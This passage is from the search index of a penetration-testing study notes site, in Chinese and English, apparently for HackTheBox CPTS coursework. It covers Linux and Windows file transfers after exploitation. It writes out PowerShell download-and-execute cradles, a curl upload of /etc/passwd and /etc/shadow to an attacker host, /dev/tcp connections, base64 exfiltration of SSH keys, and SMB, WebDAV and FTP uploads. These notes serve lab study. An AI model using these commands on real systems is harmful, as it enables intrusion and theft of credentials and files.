downloads.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#connect-to-the-target-webserver","title":"Connect to the Target Webserver","text":"<p><pre><code>TimeLess613@htb[/htb]$ exec 3&lt;&gt;/dev/tcp/10.10.10.32/80\n</code></pre> - <code>&lt;&gt;</code>\uff1a\u53cc\u5411\uff08\u6216\u53cc\u5411\u8bfb\u5199\uff09\u91cd\u5b9a\u5411     - <code>3&lt;&gt;</code>\uff1a\u6253\u5f00\u6587\u4ef6\u63cf\u8ff0\u7b263\u540c\u65f6\u8fdb\u884c\u8bfb\u53d6\u548c\u5199\u5165\u64cd\u4f5c</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#http-get-request","title":"HTTP GET Request","text":"<pre><code>TimeLess613@htb[/htb]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#print-the-response","title":"Print the Response","text":"<pre><code>TimeLess613@htb[/htb]$ cat &lt;&amp;3\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#scp","title":"scp","text":"<p>[!note] Note:\u00a0You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#upload","title":"Upload","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#web-upload","title":"Web Upload","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#create-a-self-signed-certificate","title":"Create a Self-Signed Certificate","text":"<pre><code>TimeLess613@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\nGenerating a RSA private key\n................................................................................+++++\n.......+++++\nwriting new private key to 'server.pem'\n-----\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#start-web-server","title":"Start Web Server","text":"<p>[!note] The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.</p> <pre><code>TimeLess613@htb[/htb]$ mkdir https &amp;&amp; cd https\n\nTimeLess613@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#upload-multiple-files","title":"Upload Multiple Files","text":"<p><pre><code>TimeLess613@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n</code></pre> - <code>--insecure</code>\uff1a\u56e0\u4e3a\u7528\u7684\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#scp_1","title":"scp","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#misc","title":"Misc","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#rdp","title":"RDP","text":"<p>\u6302\u8f7d</p> <pre><code>TimeLess613@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'\n</code></pre> <pre><code>TimeLess613@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer\n</code></pre> <p>\u8bbf\u95ee<code>\\\\tsclient\\</code></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#lol","title":"LOL","text":"<p>To search for the download and upload function in\u00a0GTFOBins for Linux Binaries, we can use\u00a0<code>+file download</code>\u00a0or\u00a0<code>+file upload</code>.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/","title":"WIndows","text":"<p>Let's use the\u00a0Microsoft Astaroth Attack\u00a0blog post as an example of an advanced persistent threat (APT).</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#download","title":"Download","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#powershell-base64-encode-decode","title":"PowerShell Base64 Encode &amp; Decode","text":"<p>\u5f53\u60f3\u5c06\u6587\u4ef6\u4f20\u5230\u8fdc\u7a0bhost\u4f46\u662f\u65e0\u6cd5\u7528\u7f51\u7edc\u4f20\u8f93\u65f6\uff0c\u53ef\u7b80\u5355\u5730\u7528base64\u5b57\u7b26\u4e32\u8fdb\u884c\u8f6c\u6362\u3002 \u91cd\u70b9\u662f\u786e\u8ba4\u662f\u5426\u5b8c\u597d\u4f20\u8f93\u3002 <pre><code>TimeLess613@htb[/htb]$ md5sum id_rsa\n4e301756a07ded0a2dd6953abf015278  id_rsa\n\nTimeLess613@htb[/htb]$ cat id_rsa |base64 -w 0;echo (\u6216 base64 id_rsa -w 0)\n\nPS C:\\htb&gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"&lt;base64-strings&gt;\"))\n\n\nPS C:\\htb&gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\nAlgorithm       Hash                                                                   Path\n---------       ----                                ----\nMD5             4E301756A07DED0A2DD6953ABF015278    C:\\Users\\Public\\id_rsa\n</code></pre></p> <ul> <li><code>-w 0</code>\uff1a\u5bbd\u5ea6\u65e0\u9650\uff0c\u6307\u793a\u8f93\u51fa\u7684base64\u5b57\u7b26\u4e32\u4e0d\u8fdb\u884c\u6362\u884c\u3002\u5373\u8f93\u51fa\u4e3a1\u884c\u3002</li> </ul> <p>[!NOTE] Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#powershell-web-downloads","title":"PowerShell Web Downloads","text":"<p>\u4e0b\u8f7d\u811a\u672c\u3001\u5b57\u7b26\u4e32 ^368d24</p> <p>Download Cradles</p> <pre><code># IEX\u51e0\u79cd\u5199\u6cd5\npowershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')\"\npowershell IEX (New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')\n## \u8fd8\u53ef\u4ee5pipe\n(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1') | IEX\n\n#From cmd\necho IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - \n#From PSv3\npowershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex\"\niex (iwr '10.10.14.9:8000/ipw.ps1') \n\n$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText\n$wr = [System.NET.WebRequest]::Create(\"http://10.10.14.9:8000/ipw.ps1\") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(\n\n#https://twitter.com/Alh4zr3d/status/1566489367232651264\n#host a text record with your payload at one of your (unburned) domains and do this: \npowershell . (nslookup -q=txt http://some.owned.domain.com)[-1]\n</code></pre> <p>\u4e0b\u8f7d\u6587\u4ef6 ^95a867</p> <p>[!NOTE] \u5f53\u4e0b\u8f7d\u811a\u672c\u3001\u5b57\u7b26\u4e32\u88ab\u67e5\u6740\u65f6\uff0c\u4f20\u9012nc64\u6709\u5999\u7528\u3002</p> <pre><code># \u7b80\u5355\uff1aInvoke-WebRequest\uff08\u522b\u540diwr\u3001wget\u3001curl\uff09\u3001\u9700\u8981\"-OutFile\"\u53c2\u6570\u3002\u636e\u8bf4\u8f83\u6162\nInvoke-WebRequest -uri &lt;\u653b\u51fb\u673aIP&gt;/nc64.exe -outfile [C:\\\\Windows\\Public\\]nc64.exe\n\n\npowershell -ep bypass -c (New-Object Net.WebClient).DownloadFile('&lt;url&gt;','&lt;output&gt;')\n\n(New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\n\n\n\n## \u53c2\u7167LOLBAS\ncertutil.exe\n\n## \u5fae\u8f6f\u7684Defender\u4e0b\u8f7d\npowershell -NoProfile -ExecutionPolicy Bypass -Command $d=new-object System.Net.WebClient;$d.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$d.DownloadFile('http://download.microsoft.com/download/DefinitionUpdates/mpam-fe.exe','c:\\work\\mpam-fe.exe')\n</code></pre> <p>PowerShell offers many file transfer options. In any version of PowerShell, the\u00a0System.Net.WebClient\u00a0class can be used to download a file over\u00a0<code>HTTP</code>,\u00a0<code>HTTPS</code>\u00a0or\u00a0<code>FTP</code>. The following\u00a0table\u00a0describes WebClient methods for downloading data from a resource:</p> Method Description DownloadFile Downloads data from a resource to a local file. DownloadFileAsync Downloads data from a resource to a local file without blocking the calling thread.","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#_1","title":"\u62a5\u9519\u5904\u7406","text":"<p><code>-UseBasicParsing</code>\u7ed5\u8fc7IE\u9996\u6b21\u542f\u52a8\u914d\u7f6e\u5c1a\u672a\u5b8c\u6210\u7684\u963b\u6b62\u4e0b\u8f7d\u3002 <pre><code>PS C:\\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX\n</code></pre></p> <p>SSL\u8bc1\u4e66\u62a5\u9519\u3002 <pre><code>PS C:\\htb&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nException calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust\nrelationship for the SSL/TLS secure channel.\"\nAt line:1 char:1\n+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\n\nPS C:\\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#smb-downloads","title":"SMB Downloads","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#create-the-smb-server","title":"Create the SMB Server","text":"<p>\u8fd9\u4e2a\u65b9\u5f0f\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4e0a\u4f20\u3002\u6ce8\u610f\u8fde\u63a5\u5230smbserver\u7684\u8def\u5f84\u522b\u6f0f\u4e86 <code>/share</code>\u3002</p> <pre><code>TimeLess613@htb[/htb]$ sudo impacket-smbserver -smb2support share /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#copy-a-file-from-the-smb-server","title":"Copy a File from the SMB Server","text":"<pre><code>C:\\htb&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n</code></pre> <p>New versions of Windows block unauthenticated guest access, as we can see in the following command:</p> <pre><code>C:\\htb&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n</code></pre> <p>\u6240\u4ee5\u53ef\u4ee5\u521b\u5efa\u6709\u8ba4\u8bc1\u7684share\uff0c\u5e76\u5728\u76ee\u6807\u673a\u4e0a\u6302\u8f7d\u4e4b\uff1a <pre><code>TimeLess613@htb[/htb]$ sudo impacket-smbserver -smb2support share /tmp/smbshare -user test -password test\n</code></pre></p> <p>Mount the SMB Server (to drive <code>n</code>) with Username and Password <pre><code>C:\\htb&gt; net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\htb&gt; copy n:\\nc.exe\n        1 file(s) copied.\n</code></pre></p> <p>[!NOTE] Note:\u00a0You can also mount the SMB server if you receive an error when you use <code>copy filename \\\\IP\\sharename</code>.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#ftp-downloads","title":"FTP Downloads","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#setting-up-a-python3-ftp-server","title":"Setting up a Python3 FTP Server","text":"<pre><code>TimeLess613@htb[/htb]$ sudo pip3 install pyftpdlib\n\nTimeLess613@htb[/htb]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#transfering-files-from-an-ftp-server-using-powershell","title":"Transfering Files from an FTP Server Using PowerShell","text":"<p><pre><code>PS C:\\htb&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n</code></pre> - \u4f7f\u7528\u4e86ftp\u534f\u8bae</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#ftp","title":"\u81ea\u52a8\u5316 FTP \u64cd\u4f5c","text":"<p><pre><code>C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt\n\nC:\\htb&gt; ftp -v -n -s:ftpcommand.txt\n\nftp&gt; open 192.168.49.128\nLog in with USER and PASS first.\nftp&gt; USER anonymous\n\nftp&gt; GET file.txt\nftp&gt; bye\n\nC:\\htb&gt;more file.txt\nThis is a test file\n</code></pre> - <code>-s:ftpcommand.txt</code>\uff1a\u6307\u5b9a\u547d\u4ee4\u6587\u4ef6</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#upload","title":"Upload","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#powershell-base64-encode-decode_1","title":"PowerShell Base64 Encode &amp; Decode","text":"<pre><code>PS C:\\htb&gt; [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBD...&lt;SNIP&gt;...0DQo=\n\nPS C:\\htb&gt; Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n</code></pre> <p>\u4e0a\u9762\u547d\u4ee4\u662f\u7f16\u7801UTF-16LE\uff0c<code>base64 -d</code>\u7adf\u7136\u53ef\u4ee5\u89e3\u7801\u2014\u2014\u4f3c\u4e4e\u662f\u56e0\u4e3a\u7528\u4e86<code>-Encoding byte</code>\uff0c\u5c06\u4ee5\u5b57\u8282\u5355\u4f4d\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6\u800c\u4e0d\u662f\u57fa\u4e8e\u7cfb\u7edf\u7684\u9ed8\u8ba4\u7f16\u7801\uff08Windows\u7684\u8bddUTF-16LE\uff09\u3002\u6587\u4ef6\u5185\u5bb9\u88ab\u76f4\u63a5\u8bfb\u53d6\u4e3a\u5b57\u8282\u6570\u7ec4\uff0c\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u5b57\u7b26\u7f16\u7801\u8f6c\u6362\u3002\u8fd9\u79cd\u65b9\u5f0f\u9002\u7528\u4e8e\u9700\u8981\u5904\u7406\u4e8c\u8fdb\u5236\u6587\u4ef6\u6216\u60f3\u76f4\u63a5\u64cd\u4f5c\u6587\u4ef6\u7684\u539f\u59cb\u5b57\u8282\u6570\u636e\u7684\u60c5\u51b5\u3002 <pre><code>TimeLess613@htb[/htb]$ echo IyBD...&lt;SNIP&gt;...0DQo= | base64 -d &gt; hosts\n\nTimeLess613@htb[/htb]$ md5sum hosts \n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#powershell-web-uploads","title":"PowerShell Web Uploads","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#installing-a-configured-webserver-with-upload","title":"Installing a Configured WebServer with Upload","text":"<p>uploadserver, an extended module of the Python\u00a0HTTP.server module</p> <pre><code>TimeLess613@htb[/htb]$ pip3 install uploadserver\nTimeLess613@htb[/htb]$ python3 -m uploadserver\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#powershell-script-to-upload-a-file-to-python-upload-server","title":"PowerShell Script to Upload a File to Python Upload Server","text":"<pre><code>PS C:\\htb&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n</code></pre> <p>\u6253\u9776\u7248\u672c\uff08\u672c\u5730\u5148\u4e0b\u8f7d\u811a\u672c\uff09\uff1a <pre><code>$me='10.10.14.221'; IEX (New-Object Net.WebClient).DownloadString(\"http://$($me):80/PSUpload.ps1\"); Invoke-FileUpload -Uri \"http://$($me):8000/upload\" -File \"C:\\Windows\\System32\\drivers\\etc\\hosts\"\n</code></pre></p> <p>\u4e00\u884c\u7248\u672c\uff08\u4e0d\u7528\u4e0b\u8f7d\u4e0a\u9762\u7684\u811a\u672c\u4e86\u3002\u5c11\u7528\uff0c\u4f3c\u4e4e\u4f1a\u5361\u526a\u8d34\u677f\uff09\uff1a <pre><code>function Invoke-FileUpload { Param ([Parameter(Position = 0, Mandatory = $True)] [String]$File, [Parameter(Position = 1, Mandatory = $True)] [String]$Uri) $FileToUpload = Get-ChildItem -File \"$File\"; $UTF8woBOM = New-Object \"System.Text.UTF8Encoding\" -ArgumentList @($false); $boundary = '----timeless'; $tempFile = New-TemporaryFile; Remove-Item $tempFile -Force -ErrorAction Ignore; $sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM); $fileName = [System.IO.Path]::GetFileName($FileToUpload.FullName); $sw.Write(\"--$boundary`r`nContent-Disposition: form-data;name=`\"files`\";filename=`\"$fileName`\"`r`n`r`n\"); $sw.Close(); $fs = New-Object System.IO.FileStream($tempFile, [System.IO.FileMode]::Append); $bw = New-Object System.IO.BinaryWriter($fs); $fileBinary = [System.IO.File]::ReadAllBytes($FileToUpload.FullName); $bw.Write($fileBinary); $bw.Close(); $sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM); $sw.Write(\"`r`n--$boundary--`r`n\"); $sw.Close(); Invoke-RestMethod -Method POST -Uri $uri -ContentType \"multipart/form-data; boundary=$boundary\" -InFile $tempFile; $FileHash = Get-FileHash -Path \"$File\" -Algorithm MD5; Write-Host \"[+] File Uploaded: \" $FileToUpload.FullName; Write-Host \"[+] FileHash: \" $FileHash.Hash };   Invoke-FileUpload -Uri http://10.10.14.221:8000/upload -File upload_win.zip\n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#powershell-base64-web-upload","title":"PowerShell Base64 Web Upload","text":"<pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte));   Invoke-WebRequest -Uri http://10.10.14.221:8000/ -Method POST -Body $b64\n</code></pre> <p>To receive: <pre><code>TimeLess613@htb[/htb]$ nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923\nPOST / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682\nContent-Type: application/x-www-form-urlencoded\nHost: 192.168.49.128:8000\nContent-Length: 1820\nConnection: Keep-Alive\n\nIyBDb3B5cm...SNIP...\n\nTimeLess613@htb[/htb]$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#smb-uploads-over-http","title":"SMB Uploads over HTTP","text":"<p>Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.</p> <ul> <li>For more information: Preventing SMB traffic from lateral connections and entering or leaving the network</li> </ul> <p>An alternative is to run SMB over HTTP with\u00a0<code>WebDav</code>.\u00a0 <code>WebDAV</code> (RFC 4918)\u00a0is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The\u00a0<code>WebDAV</code>\u00a0protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring.\u00a0<code>WebDAV</code>\u00a0can also use HTTPS.</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#configuring-webdav-server","title":"Configuring WebDav Server","text":"<pre><code>TimeLess613@htb[/htb]$ sudo pip3 install wsgidav cheroot\nTimeLess613@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#connecting-to-the-webdav-share","title":"Connecting to the Webdav Share","text":"<p>When you use\u00a0<code>SMB</code>, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.</p> <pre><code>C:\\htb&gt; dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    &lt;DIR&gt;          .\n05/18/2022  10:05 AM    &lt;DIR&gt;          ..\n05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n</code></pre> <ul> <li>DavWWWRoot\uff1a\u6307\u793a\u8ddf\u76ee\u5f55\u3002\u4e5f\u53ef\u6307\u5b9a\u5176\u4ed6\u5b58\u5728\u7684\u76ee\u5f55\u3002</li> </ul>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#uploading-files-using-smb","title":"Uploading Files using SMB","text":"<pre><code>C:\\htb&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\htb&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n</code></pre> <p>[!note] \u5982\u679c\u6ca1\u6709SMB\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u7528\u524d\u9762\u7684<code>impacket-smbserver</code>\u65b9\u6cd5</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#ftp-uploads","title":"FTP Uploads","text":"<p>\u7c7b\u4f3c\u4e0b\u8f7d\u65f6\u3002</p> <p><pre><code>TimeLess613@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> - <code>--write</code>\uff1a\u5141\u8bb8\u5199\u5165\u5230\u670d\u52a1\u7aef</p> <pre><code>PS C:\\htb&gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Windows/#ftp_1","title":"\u81ea\u52a8\u5316 FTP \u64cd\u4f5c","text":"<p><pre><code>C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo PUT c:\\windows\\system32\\drivers\\etc\\hosts &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\htb&gt; ftp -v -n 